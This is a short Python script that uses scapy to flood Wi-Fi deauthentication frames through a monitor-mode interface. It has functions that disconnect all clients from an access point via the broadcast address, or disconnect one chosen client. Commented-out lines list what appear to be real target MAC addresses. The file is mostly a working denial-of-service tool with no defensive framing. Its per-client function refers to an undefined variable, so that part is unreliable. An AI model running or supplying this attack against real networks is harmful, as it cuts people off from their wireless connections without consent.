from scapy.all import *

interface = 'wlp5s0mon'
# AP_MAC = '94:B4:0F:25:E4:61'
# AP_MAC = '68:ff:7b:88:07:5c'
# AP_MAC = '9A:B8:BA:14:4A:54'
# target = '98:B8:BA:93:4A:54'
# target = 'C0:E4:34:E1:1B:33'
# target = 'AA:4F:A8:22:03:46'
client_fake_MAC = 'FF:FF:FF:FF:FF:FF' # This is for AP Attack without CLient MAC Address

def deauth_specific_victim(Victim_MAC, AP_MAC):
    packet = RadioTap()/Dot11(addr1=target, addr2=AP_MAC, addr3=AP_MAC)/Dot11Deauth()
    return packet

def deauth_ap(AP_MAC):
    packet_ap = RadioTap()/Dot11(addr1=client_fake_MAC, addr2=AP_MAC, addr3=AP_MAC)/Dot11Deauth()
    return packet_ap

def craft_deauth_attack_to_AP(AP_MAC):
    pkt = deauth_ap(AP_MAC)
    sendp(pkt, iface = interface, count = 20, inter= .001)

def craft_deauth_attack_to_client(target, AP_MAC):
    pkt = deauth_specific_victim(target, AP_MAC)
    sendp(pkt, iface = interface, count = 20, inter= .001)
